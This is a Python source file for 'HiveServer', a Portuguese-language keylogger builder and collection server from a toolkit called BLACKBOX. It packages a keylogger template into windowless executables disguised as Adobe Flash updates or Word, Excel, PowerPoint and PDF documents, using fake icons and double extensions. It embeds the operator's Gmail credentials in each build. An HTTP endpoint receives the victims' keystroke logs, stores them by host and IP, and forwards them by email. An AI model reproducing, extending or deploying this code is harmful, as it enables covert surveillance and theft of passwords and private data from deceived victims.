#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# HiveServer.py - Servidor Central para BLACKBOX
# Author: Guilherme Alexander
# https://github.com/Guilherme-alexander

import os
import sys
import json
import datetime
import smtplib
import socket
import threading
import time
import random
import string
import subprocess
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse
import getpass

# Cores para terminal
BLUE = '\033[94m'
RED = '\033[91m'
WHITE = '\033[97m'
YELLOW = '\033[93m'
MAGENTA = '\033[1;35m'
GREEN = '\033[1;32m'
END = '\033[0m'

# Configurações
CONFIG_FILE = 'hive_config.json'
LOG_DIR = 'hive_logs'
HOST = '0.0.0.0'
PORT = 5000

class HiveServer:
    """Servidor central para coleta de logs dos keyloggers"""
    
    def __init__(self):
        self.email = None
        self.epass = None
        self.server = None
        self.running = False
        self.server_url = None
        
        # Cria diretório de logs se não existir
        if not os.path.exists(LOG_DIR):
            os.makedirs(LOG_DIR)
            
        self.load_config()
        
    def load_config(self):
        """Carrega configurações do arquivo .env ou JSON"""
        if os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE, 'r') as f:
                    config = json.load(f)
                    self.email = config.get('email')
                    self.epass = config.get('password')
                    self.server_url = config.get('server_url', f'http://{self.get_local_ip()}:{PORT}/log')
                    print(f"{GREEN}[+] Configurações carregadas de {CONFIG_FILE}{END}")
                    return True
            except:
                print(f"{RED}[-] Erro ao carregar configurações{END}")
                return False
        return False
    
    def save_config(self, email=None, password=None, server_url=None):
        """Salva configurações em arquivo JSON"""
        config = {
            'email': email or self.email,
            'password': password or self.epass,
            'server_url': server_url or self.server_url or f'http://{self.get_local_ip()}:{PORT}/log',
            'updated_at': datetime.datetime.now().isoformat()
        }
        try:
            with open(CONFIG_FILE, 'w') as f:
                json.dump(config, f, indent=4)
            print(f"{GREEN}[+] Configurações salvas em {CONFIG_FILE}{END}")
            return True
        except Exception as e:
            print(f"{RED}[-] Erro ao salvar configurações: {e}{END}")
            return False
    
    def setup_credentials(self):
        """Configura credenciais via input"""
        clear()
        print(f"""{WHITE}
╔════════════════════════════════════════════════════════════╗
║              {YELLOW}CONFIGURAÇÃO DO HIVE SERVER{WHITE}                   ║
╚════════════════════════════════════════════════════════════╝
{END}""")
        
        print(f"\n{YELLOW}[!] Configure as credenciais para envio de logs{END}")
        print(f"{WHITE}[*] Será usado para enviar logs por e-mail{END}\n")
        
        email = input(f"{RED}📧 E-mail Gmail: {END}").strip()
        epass = getpass.getpass(f"{RED}🔑 Senha do Gmail: {END}")
        
        # Obtém IP local para URL do servidor
        local_ip = self.get_local_ip()
        default_url = f'http://{local_ip}:{PORT}/log'
        server_url = input(f"{GREEN}🌐 URL do servidor (Enter para {default_url}): {END}").strip()
        if not server_url:
            server_url = default_url
        
        print(f"\n{BLUE}╔════════════════════════════════════════════════════════════╗{END}")
        print(f"{WHITE}  E-mail: {GREEN}{email}{END}")
        print(f"{WHITE}  Senha:  {GREEN}{'*' * len(epass)}{END}")
        print(f"{WHITE}  URL:    {GREEN}{server_url}{END}")
        print(f"{BLUE}╚════════════════════════════════════════════════════════════╝{END}")
        
        confirm = input(f"\n{WHITE}Deseja salvar estas credenciais? (s/N): {END}").strip().lower()
        
        if confirm == 's':
            self.email = email
            self.epass = epass
            self.server_url = server_url
            self.save_config(email, epass, server_url)
            print(f"{GREEN}[+] Credenciais salvas com sucesso!{END}")
        else:
            print(f"{YELLOW}[!] Credenciais não salvas. Use temporariamente.{END}")
            self.email = email
            self.epass = epass
            self.server_url = server_url
            
        input(f"\n{WHITE}Pressione [ENTER] para continuar...{END}")
    
    def randomword(self, length=10):
        """Gera uma string aleatória"""
        return ''.join(random.choice(string.ascii_lowercase) for i in range(length))
    
    def build_keylogger(self):
        """Constrói o keylogger com PyInstaller"""
        clear()
        print(f"""{BLUE}
╔════════════════════════════════════════════════════════════╗
║              GERADOR DE KEYLOGGER - HIVE                   ║
╚════════════════════════════════════════════════════════════╝
{END}""")
        
        # Verifica se as credenciais estão configuradas
        if not self.email or not self.epass:
            print(f"{RED}[-] Credenciais não configuradas!{END}")
            print(f"{YELLOW}[!] Configure primeiro as credenciais (opção 2){END}")
            input(f"\n{WHITE}Pressione [ENTER] para continuar...{END}")
            return
        
        # Verifica se o template existe
        template_path = 'Templates/Bee.py'
        if not os.path.exists(template_path):
            print(f"{RED}[-] Template não encontrado: {template_path}{END}")
            input(f"\n{WHITE}Pressione [ENTER] para continuar...{END}")
            return
        
        print(f"\n{WHITE}[*] Usando template: {GREEN}{template_path}{END}")
        print(f"{WHITE}[*] E-mail: {GREEN}{self.email}{END}")
        print(f"{WHITE}[*] URL do Servidor: {GREEN}{self.server_url}{END}")
        
        confirm = input(f"\n{WHITE}Deseja continuar com estas configurações? (s/N): {END}").strip().lower()
        if confirm != 's':
            print(f"{YELLOW}[!] Geração cancelada.{END}")
            input(f"\n{WHITE}Pressione [ENTER] para continuar...{END}")
            return
        
        # Lê o template
        with open(template_path, 'r', encoding='utf-8') as template:
            o = template.read()
        
        # Constrói o payload com as configurações
        payload = '#!/usr/bin/env python3\n'
        payload += '# -*- coding: utf-8 -*-\n'
        payload += '# Keylogger gerado pelo BLACKBOX HiveServer\n'
        payload += '# Author: Guilherme Alexander\n'
        payload += '# https://github.com/Guilherme-alexander\n\n'
        payload += f'EEMAIL = "{self.email}"\n'
        payload += f'EPASS = "{self.epass}"\n'
        payload += f'SERVER_URL = "{self.server_url}"\n\n'
        payload += str(o)
        
        # Salva o arquivo temporário
        with open('k.py', 'w', encoding='utf-8') as f:
            f.write(payload)
        
        print(f"\n{BLUE}[*] Construindo keylogger...{END}")
        
        # Comando PyInstaller
        if sys.platform == 'win32':
            pyinstaller = 'pyinstaller'
            python_cmd = 'python'
        else:
            # Para Linux com Wine
            if os.path.exists('/root/.wine/drive_c/Python27/python.exe'):
                pyinstaller = '/root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py'
            else:
                # Fallback para pyinstaller local
                pyinstaller = 'pyinstaller'
        
        # Menu de opções de build
        print(f"\n{WHITE}╔════════════════════════════════════════════════════════════╗{END}")
        print(f"{WHITE}║           SELECIONE O TIPO DE KEYLOGGER                    ║{END}")
        print(f"{WHITE}╠════════════════════════════════════════════════════════════╣{END}")
        print(f"{WHITE}║  [{GREEN}1{WHITE}] Adobe Flash Update   (Ícone Flash)                ║{END}")
        print(f"{WHITE}║  [{GREEN}2{WHITE}] Fake Word docx      (Ícone Word)                  ║{END}")
        print(f"{WHITE}║  [{GREEN}3{WHITE}] Fake Excel xlsx     (Ícone Excel)                  ║{END}")
        print(f"{WHITE}║  [{GREEN}4{WHITE}] Fake Powerpoint pptx(Ícone PowerPoint)             ║{END}")
        print(f"{WHITE}║  [{GREEN}5{WHITE}] Fake Acrobat pdf   (Ícone PDF)                    ║{END}")
        print(f"{WHITE}║  [{GREEN}6{WHITE}] Blank Executable   (Sem ícone)                    ║{END}")
        print(f"{WHITE}╚════════════════════════════════════════════════════════════╝{END}")
        
        build_choice = input(f"\n{GREEN} HIVE >> {END}").strip()
        
        # Configurações de build
        configs = {
            '1': {
                'version': 'Resource/adobe.template',
                'icon': 'Icons/flash.ico',
                'name': 'Bee_Flash_.exe',
                'manifest': '-m Manifest/manifest.manifest',
                'desc': 'Adobe Flash Update'
            },
            '2': {
                'version': 'Resource/word.template',
                'icon': 'Icons/word.ico',
                'name': 'Bee_Word_.docx.exe',
                'manifest': '-m Manifest/manifest.manifest',
                'desc': 'Fake Word docx'
            },
            '3': {
                'version': 'Resource/excel.template',
                'icon': 'Icons/excel.ico',
                'name': 'Bee_Excel_.xlsx.exe',
                'manifest': '-m Manifest/manifest.manifest',
                'desc': 'Fake Excel xlsx'
            },
            '4': {
                'version': 'Resource/powerpoint.template',
                'icon': 'Icons/powerpoint.ico',
                'name': 'Bee_Power_.pptx.exe',
                'manifest': '-m Manifest/manifest.manifest',
                'desc': 'Fake Powerpoint pptx'
            },
            '5': {
                'version': 'Resource/acrobat.template',
                'icon': 'Icons/acrobat.ico',
                'name': 'Bee_AcrobatPDF_.pdf.exe',
                'manifest': '-m Manifest/manifest.manifest',
                'desc': 'Fake Acrobat pdf'
            },
            '6': {
                'version': None,
                'icon': None,
                'name': 'Bee.exe',
                'manifest': '-m Manifest/manifest.manifest',
                'desc': 'Blank Executable'
            }
        }
        
        config = configs.get(build_choice)
        if not config:
            print(f"{RED}[!] Opção inválida!{END}")
            input(f"\n{WHITE}Pressione [ENTER] para continuar...{END}")
            return
        
        # Remove pasta dist anterior
        if os.path.exists('dist'):
            os.system('rm -Rf dist' if os.name == 'posix' else 'rmdir /s dist')
        
        # Monta comando
        cmd = f'{pyinstaller} --noconsole'
        
        if config['manifest']:
            cmd += f' {config["manifest"]}'
        
        if config['version'] and os.path.exists(config['version']):
            cmd += f' --version-file={config["version"]}'
        
        if config['icon'] and os.path.exists(config['icon']):
            cmd += f' -i {config["icon"]}'
        
        cmd += ' -F k.py'
        
        print(f"\n{BLUE}[*] Executando: {cmd}{END}")
        os.system(cmd)
        
        # Limpeza
        for item in ['build', 'k.spec', 'k.py']:
            if os.path.exists(item):
                if os.path.isdir(item):
                    os.system(f'rm -Rf {item}' if os.name == 'posix' else f'rmdir /s {item}')
                else:
                    try:
                        os.remove(item)
                    except:
                        pass
        
        # Renomeia o executável
        if os.path.exists('dist/k.exe'):
            os.rename('dist/k.exe', 'dist/' + config['name'])
            clear()
            print(f"""{GREEN}
╔════════════════════════════════════════════════════════════╗
║                  ✅ KEYLOGGER GERADO                       ║
╠════════════════════════════════════════════════════════════╣
║  Tipo: {WHITE}{config['desc']}{GREEN}                                     ║
║  Arquivo: {WHITE}{config['name']}{GREEN}                                  ║
║  Local: {WHITE}dist/{config['name']}{GREEN}                               ║
║  E-mail: {WHITE}{self.email}{GREEN}                                       ║
║  Servidor: {WHITE}{self.server_url}{GREEN}                                ║
╚════════════════════════════════════════════════════════════╝
{END}""")
        else:
            print(f"{RED}[-] Erro ao gerar keylogger!{END}")
        
        input(f"\n{WHITE}Pressione [ENTER] para continuar...{END}")
    
    def send_email(self, subject, message):
        """Envia e-mail com os logs"""
        if not self.email or not self.epass:
            print(f"{RED}[-] Credenciais não configuradas!{END}")
            return False
            
        try:
            msg = MIMEMultipart()
            msg['From'] = self.email
            msg['To'] = self.email
            msg['Subject'] = subject
            
            msg.attach(MIMEText(message, 'plain'))
            
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(self.email, self.epass)
            server.send_message(msg)
            server.quit()
            
            print(f"{GREEN}[+] E-mail enviado: {subject}{END}")
            return True
            
        except Exception as e:
            print(f"{RED}[-] Erro ao enviar e-mail: {e}{END}")
            return False
    
    def process_log(self, data):
        """Processa e armazena os logs recebidos"""
        try:
            # Extrai dados
            client_ip = data.get('client_ip', 'unknown')
            hostname = data.get('hostname', 'unknown')
            log_data = data.get('data', '')
            timestamp = datetime.datetime.now().isoformat()
            
            # Cria nome do arquivo
            filename = os.path.join(LOG_DIR, f"{hostname}_{client_ip}.log")
            
            # Formata a entrada
            log_entry = f"[{timestamp}] (IP: {client_ip})\n{log_data}\n{'-'*60}\n\n"
            
            # Salva no arquivo
            with open(filename, 'a', encoding='utf-8') as f:
                f.write(log_entry)
            
            print(f"{GREEN}[+] Log salvo de {hostname} ({client_ip}) - {len(log_data)} caracteres{END}")
            
            # Envia por e-mail se configurado
            if self.email and self.epass:
                subject = f"🐝 Log: {hostname} - {timestamp[:10]}"
                message = f"Host: {hostname}\nIP: {client_ip}\nData: {timestamp}\n\n{log_data}"
                self.send_email(subject, message)
            
            return True
            
        except Exception as e:
            print(f"{RED}[-] Erro ao processar log: {e}{END}")
            return False
    
    def view_logs(self):
        """Exibe os logs armazenados"""
        clear()
        print(f"""{BLUE}
╔════════════════════════════════════════════════════════════╗
║                    VISUALIZAR LOGS                         ║
╚════════════════════════════════════════════════════════════╝
{END}""")
        
        log_files = [f for f in os.listdir(LOG_DIR) if f.endswith('.log')]
        
        if not log_files:
            print(f"{YELLOW}[!] Nenhum log encontrado.{END}")
            input(f"\n{WHITE}Pressione [ENTER] para continuar...{END}")
            return
        
        print(f"{WHITE}Arquivos de log disponíveis:{END}\n")
        for i, file in enumerate(log_files, 1):
            size = os.path.getsize(os.path.join(LOG_DIR, file))
            print(f"  {GREEN}[{i}]{END} {file} ({size} bytes)")
        
        choice = input(f"\n{WHITE}Selecione um arquivo (0 para voltar): {END}").strip()
        
        if choice == '0':
            return
        
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(log_files):
                filepath = os.path.join(LOG_DIR, log_files[idx])
                clear()
                print(f"{BLUE}╔════════════════════════════════════════════════════════════╗{END}")
                print(f"{WHITE}  Arquivo: {GREEN}{log_files[idx]}{END}")
                print(f"{BLUE}╚════════════════════════════════════════════════════════════╝{END}\n")
                
                with open(filepath, 'r', encoding='utf-8') as f:
                    content = f.read()
                    # Limita a exibição a 500 linhas
                    lines = content.split('\n')
                    if len(lines) > 500:
                        print(f"{YELLOW}[!] Mostrando apenas as últimas 500 linhas{END}\n")
                        content = '\n'.join(lines[-500:])
                    print(content)
                
                input(f"\n{WHITE}Pressione [ENTER] para continuar...{END}")
        except:
            print(f"{RED}[!] Opção inválida!{END}")
            time.sleep(1)
    
    def start_server(self):
        """Inicia o servidor HTTP"""
        class LogHandler(BaseHTTPRequestHandler):
            server_instance = None
            
            def do_POST(self):
                """Recebe logs via POST"""
                if self.path == '/log':
                    try:
                        content_length = int(self.headers['Content-Length'])
                        post_data = self.rfile.read(content_length)
                        data = json.loads(post_data.decode('utf-8'))
                        
                        # Adiciona IP do cliente
                        data['client_ip'] = self.client_address[0]
                        
                        # Processa o log
                        if self.server_instance:
                            success = self.server_instance.process_log(data)
                            
                            if success:
                                self.send_response(200)
                                self.send_header('Content-Type', 'application/json')
                                self.end_headers()
                                self.wfile.write(json.dumps({'status': 'success'}).encode('utf-8'))
                            else:
                                self.send_response(500)
                                self.end_headers()
                        else:
                            self.send_response(500)
                            self.end_headers()
                            
                    except Exception as e:
                        print(f"{RED}[-] Erro na requisição: {e}{END}")
                        self.send_response(400)
                        self.end_headers()
            
            def do_GET(self):
                """Página de status"""
                if self.path == '/':
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/html; charset=utf-8')
                    self.end_headers()
                    
                    html = f"""
                    <!DOCTYPE html>
                    <html>
                    <head>
                        <title>🐝 HiveServer - BLACKBOX</title>
                        <style>
                            body {{ font-family: Arial; margin: 40px; background: #1a1a1a; color: #fff; }}
                            .container {{ max-width: 800px; margin: 0 auto; }}
                            .card {{ background: #2d2d2d; padding: 20px; border-radius: 10px; margin: 20px 0; }}
                            .status {{ color: #4CAF50; font-weight: bold; }}
                            .info {{ color: #ff9800; }}
                            h1 {{ color: #4CAF50; }}
                            ul {{ list-style: none; padding: 0; }}
                            li {{ padding: 10px; background: #3d3d3d; margin: 5px 0; border-radius: 5px; }}
                        </style>
                    </head>
                    <body>
                        <div class="container">
                            <h1>🐝 HiveServer - Status</h1>
                            <div class="card">
                                <p><span class="status">✅ Servidor Ativo</span></p>
                                <p><span class="info">📧 E-mail:</span> {self.server_instance.email if self.server_instance else 'Não configurado'}</p>
                                <p><span class="info">📁 Logs:</span> {LOG_DIR}/</p>
                                <p><span class="info">🔌 Endpoint:</span> POST /log</p>
                            </div>
                            <div class="card">
                                <h3>📊 Estatísticas</h3>
                                <p>Total de logs: {len([f for f in os.listdir(LOG_DIR) if f.endswith('.log')])}</p>
                                <p>Última atualização: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
                            </div>
                        </div>
                    </body>
                    </html>
                    """
                    self.wfile.write(html.encode('utf-8'))
                else:
                    self.send_response(404)
                    self.end_headers()
            
            def log_message(self, format, *args):
                # Suprime logs do servidor
                pass
        
        LogHandler.server_instance = self
        
        try:
            self.server = HTTPServer((HOST, PORT), LogHandler)
            self.running = True
            print(f"{GREEN}╔════════════════════════════════════════════════════════════╗{END}")
            print(f"{GREEN}║           🐝 HIVE SERVER INICIADO COM SUCESSO              ║{END}")
            print(f"{GREEN}╚════════════════════════════════════════════════════════════╝{END}")
            print(f"\n{WHITE}[+] Servidor rodando em: {GREEN}http://{self.get_local_ip()}:{PORT}{END}")
            print(f"{WHITE}[+] Endpoint para logs: {GREEN}POST http://{self.get_local_ip()}:{PORT}/log{END}")
            print(f"{WHITE}[+] Pasta de logs: {GREEN}{os.path.abspath(LOG_DIR)}{END}")
            print(f"{WHITE}[+] Pressione {YELLOW}CTRL+C{WHITE} para parar o servidor{END}\n")
            
            self.server.serve_forever()
            
        except KeyboardInterrupt:
            print(f"\n{YELLOW}[!] Desligando servidor...{END}")
            self.running = False
        except Exception as e:
            print(f"{RED}[-] Erro ao iniciar servidor: {e}{END}")
            input(f"\n{WHITE}Pressione [ENTER] para continuar...{END}")
    
    def get_local_ip(self):
        """Obtém o IP local da máquina"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return '127.0.0.1'

def clear():
    """Limpa a tela"""
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    """Exibe banner do HiveServer"""
    clear()
    print(f"""{WHITE}
    ╔════════════════════════════════════════════════════════════╗
    ║                      {YELLOW}🐝 HIVE SERVER{WHITE}                        ║
    ║                 {YELLOW}Servidor Central BLACKBOX{WHITE}                  ║
    ║            {YELLOW}https://github.com/Guilherme-alexander{WHITE}          ║
    ╚════════════════════════════════════════════════════════════╝
    ╔════════════════════════════════════════════════════════════╗
    ║  [{YELLOW}1{WHITE}] Iniciar Servidor                                      ║
    ║  [{YELLOW}2{WHITE}] Configurar Credenciais                                ║
    ║  [{YELLOW}3{WHITE}] Gerar KeyLogger                                       ║
    ║  [{YELLOW}4{WHITE}] Visualizar Logs                                       ║
    ║  [{YELLOW}5{WHITE}] Limpar Logs                                           ║
    ║  [{YELLOW}0{WHITE}] Voltar ao BLACKBOX                                    ║
    ╚════════════════════════════════════════════════════════════╝
{END}""")

def menu():
    """Menu principal do HiveServer"""
    hive = HiveServer()
    
    while True:
        banner()
        
        choice = input(f"{GREEN} HIVE >> {END}").strip()
        
        if choice == '1':
            # Inicia servidor
            if not hive.email or not hive.epass:
                print(f"{YELLOW}[!] Credenciais não configuradas! Configure primeiro.{END}")
                time.sleep(1)
                continue
            hive.start_server()
            
        elif choice == '2':
            # Configurar credenciais
            hive.setup_credentials()
            
        elif choice == '3':
            # Gerar KeyLogger
            hive.build_keylogger()
            
        elif choice == '4':
            # Visualizar logs
            hive.view_logs()
            
        elif choice == '5':
            # Limpar logs
            clear()
            confirm = input(f"{RED}[!] Tem certeza que deseja limpar todos os logs? (s/N): {END}").strip().lower()
            if confirm == 's':
                for file in os.listdir(LOG_DIR):
                    if file.endswith('.log'):
                        os.remove(os.path.join(LOG_DIR, file))
                print(f"{GREEN}[+] Logs limpos!{END}")
                time.sleep(1)
                
        elif choice == '0':
            break
        else:
            print(f"{RED}[!] Opção inválida!{END}")
            time.sleep(1)

if __name__ == '__main__':
    menu()
